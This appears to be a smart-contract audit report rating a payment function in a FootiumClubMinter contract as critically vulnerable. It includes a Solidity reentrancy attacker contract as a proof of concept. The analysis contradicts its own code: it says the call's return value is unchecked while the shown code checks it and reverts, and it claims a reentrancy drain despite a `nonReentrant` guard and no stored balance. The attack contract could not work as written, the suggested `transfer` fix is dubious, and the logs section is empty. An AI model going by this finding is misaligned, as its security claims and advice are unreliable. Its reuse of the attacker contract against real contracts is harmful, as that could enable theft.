# Potential Loss of Funds in `MakePayment` Function (Direct Call + Unprotected Transfer)

## Severity
- Critical
## Summary
The code directly transfers the received payment (`msg.value`) to the `paymentReceiverAddress` using `call{value}`. This approach is risky and prone to potential vulnerabilities, such as contract compromise, reentrancy attacks, or loss of funds.
## Vulnerability Detail
The makePayment function uses the call{value} function to send the payment to the paymentReceiverAddress. This function allows the recipient to execute arbitrary code and data, and returns a boolean value indicating the success or failure of the call. However, this function does not revert the transaction if the call fails, and does not limit the amount of gas available for the call. This could lead to several potential vulnerabilities, such as:

- Contract compromise: If the paymentReceiverAddress is compromised (e.g., hacked), the attacker could steal all incoming payments by intercepting the call and redirecting the funds to their own address.
- Reentrancy vulnerability: While the function uses nonReentrant, the direct call to paymentReceiverAddress within the reentrancy guard might not be fully protected. Malicious contracts could exploit this and re-enter the makePayment function before the state is updated, and drain the funds.
- Loss of funds: If the paymentReceiverAddress is a contract that fails or does not have a fallback function, the call will return false and the payment will be lost. The function does not check the return value of the call, and does not revert or retry the transaction in case of failure.
## Impact
An attacker could exploit this vulnerability to drain the contract balance, resulting in a loss of funds for the users and the contract owner.

## Tool used
- Manual Review
## Test Case
```solidity
// A malicious contract that implements a fallback function
contract Attacker {
  // The address of the vulnerable contract
  address payable public target;

  // The constructor sets the target address
  constructor(address payable _target) {
    target = _target;
  }

  // A function to initiate the attack
  function attack() external payable {
    // Send some ether to the target contract
    target.transfer(msg.value);
    // Call the makePayment function of the target contract
    target.call(abi.encodeWithSignature("makePayment(uint256,string)", 1, "Feature Payment"));
  }

  // A fallback function that re-enters the makePayment function
  receive() external payable {
    if (address(target).balance > 0) {
      target.call(abi.encodeWithSignature("makePayment(uint256,string)", 1, "Feature Payment"));
    }
  }
}

// The vulnerable contract
contract FootiumClubMinter {
  // ...

  // The makePayment function
  function makePayment(uint256 _clubId, string calldata _message)
    external
    payable
    whenNotPaused
    nonReentrant
  {
    // Require that the sender is the owner of the club
    if (msg.sender != footiumClub.ownerOf(_clubId)) {
      revert NotClubOwner(_clubId, msg.sender);
    }

    // Require that the payment amount is greater than 0
    if (msg.value <= 0) {
      revert IncorrectETHAmount(msg.value);
    }

    // Send the payment to the payment receiver address
    // Use call instead of transfer for better security
    (bool sent, ) = paymentReceiverAddress.call{value: msg.value}("");
    if (!sent) {
      revert FailedToSendETH(msg.value);
    }

    emit PaymentMade(_clubId, msg.value, _message);
  }
}
```
## Logs

```
## Recommendation
To fix this vulnerability, you can use the transfer function instead of the call function to send the payment to the paymentReceiverAddress. The transfer function is safer and simpler, as it only sends the specified amount of ether and does not allow any data or code execution. It also reverts the transaction if the recipient is a contract that fails or does not have a fallback function. 
```solidity
// Send the payment to the payment receiver address
// Use transfer instead of call for better security
paymentReceiverAddress.transfer(msg.value);
